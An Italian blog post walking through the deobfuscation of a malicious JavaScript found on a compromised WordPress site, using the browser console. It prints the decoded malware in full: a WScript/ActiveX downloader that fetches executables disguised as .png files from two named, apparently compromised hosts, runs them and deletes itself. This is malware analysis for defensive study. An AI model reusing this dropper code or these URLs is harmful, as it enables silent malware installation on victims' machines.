---
layout: post
title: "Decifrare semplici Javascript malevoli"
promotion: 
modified: 
featured: true
category: [post]
tags: [javascript, malware, evilcode]
image:
  feature: code.jpg
  credit: Christiaan Colen
  creditlink: https://flic.kr/p/ydTDpb
comments: true
share: true
---
Compromettere un sito, può essere una cosa semplice. Compromettere un sito
basato su [WordPress](https://wordpress.org) può essere una cosa molto
semplice. 

Semplicemente chi usa [WordPress](https://wordpress.org) vuole qualcosa di
semplice e veloce per essere online il prima possibile. Spesso per questo
genere di progetti, il budget a disposizione è limitato e, di conseguenza, temi
come _hardening_ o _penetration test_ non trovano spazio nelle voci di
bilancio.

Bucare un sito in WordPress, per distribuire codice malevolo è una pratica abbastanza comune. E' quello che ha notato un amico, ieri durante un test.

Ha trovato [questo codice JavaScript](http://pastebin.com/AjyQ8wwC),
all'interno di un sito. Dedicato ad altre attività sul sito, ha chiesto una
mano per decifrare al volo quello che, a prima vista, era un codice JavaScript
un po' "offuscato".

In questo caso la struttura del codice era abbastanza chiara. Nella prima
variabile, _links_, dovevano esserci delle url, probabilmente afferenti ad un
secondo _stage_ di questo malware. Nella seconda variabile, _code_, doveva
esserci il codice vero e proprio del malware ed in coda la coppia formata dalla
routine per mettere in chiaro _links_ e _code_ ed il codice per innescare tutto
il processo.

{% highlight js %}
function d( c )
{
    c = c.split( '' );
    for( var i = 0; i < c.length; i += 3 ) {
        c[ i ] = '';
    }
    return c.join( '' );
}
{% endhighlight %}

Come lo possiamo mettere in chiaro per una successiva analisi? Semplice. Ci
serve un browser e la console con gli strumenti di sviluppo.

![Il nostro tool di deobfuscation]({{site.url}}/assets/images/js_open_web_console.png)

Una volta qui, la prima cosa che dobbiamo fare è dichiarare la routine di
decifratura. La funzione _d()_ in questo caso.

![Dichiaro d()]({{site.url}}/assets/images/js_declare_decrypt_routine.png)

Incolliamo poi, all'interno della console, le due variabili _links_ e _code_
che ci interessa mettere in chiaro. Attenzione, poiché stiamo parlando con
l'interprete JavaScript del browser, dobbiamo incollare l'intera dichiarazione
della variabile, in modo che sia sintatticamente corretta.

![Dichiaro le due variabili]({{site.url}}/assets/images/js_paste_encrypted_strings.png)

A questo punto, il gioco è fatto. Basta invocare la nostra routine di
decifratura, _d()_, sulle variabili _links_ e _code_ ed abbiamo il codice dle
malwar in chiaro.

![Decifro le stringhe]({{site.url}}/assets/images/js_decrpyt_strings.png)

_Voilà_, [decifrato](http://pastebin.com/mUt43QTb)

Questi i link contenenti il payload da scaricare sul browser della vittima:

{%highlight js%}
"var links = ["http://www.stageportieri.it/wp/P330494.png","http://www.starcrossedgdr.altervista.org/pages/im/P0003939.png"];"
{%endhighlight%}

Questo il codice malevolo:

{%highlight js%}
"var ws = new ActiveXObject( "WScript.Shell" );if( ws.Exec( "ping" ).StdOut.ReadAll().match( /ping/ ) ) {    var obj = new ActiveXObject( "MSXML2.XMLHTTP" );    var File = WScript.CreateObject( "Scripting.FileSystemObject" );    var temp = File.GetSpecialFolder( 2 );    function genFileName()    {        return "/" + Math.round( Math.random() * 999999999 ) + ".exe";    }    function run( filename )    {        var ws = new ActiveXObject( "WScript.Shell" );        ws.Run( filename, 1, 0 );    }    function saveFile( body, filename )    {        Stream.Open();        Stream.Type = 1;        Stream.Write( body );        Stream.Position = 0;        Stream.SaveToFile( filename, 2 );        Stream.Close();    }    function deleteFile( filename )    {        if( File.FileExists( filename ) ) {            File.DeleteFile( filename );        }    }    function suicide()    {        deleteFile( WScript.ScriptFullName )    }    var Stream = new ActiveXObject( "ADODB.Stream" );    for( var i = 0; i < links.length; i++ ) {        var filename = temp + genFileName();        obj.Open( "GET", links[ i ], false );        obj.Send();        if( obj.Status == 200 ) {            try {                saveFile( obj.ResponseBody, filename );                run( filename );                done = true;            }            catch( err ) {            }        }    }    suicide();}"
{% endhighlight %}

Analizzandolo, abbiamo un codice che vuole creare un oggetto ActiveX, quindi un
codice pensato per colpire vittimeWindows con Internet Explorer. I due link,
probabilmente piazzati lì dopo aver compromesso anche le macchine che li
ospitano, non sono ovviamente immagini, ma sono due file eseguibili.

Il codice, cerca di scaricarli dalla rete e li lancia in esecuzione. Purtroppo
nessuno dei due file era disponibile al momento della scrittura di questo post,
quindi niente analisi del codice della fase 2.

Enjoy it!
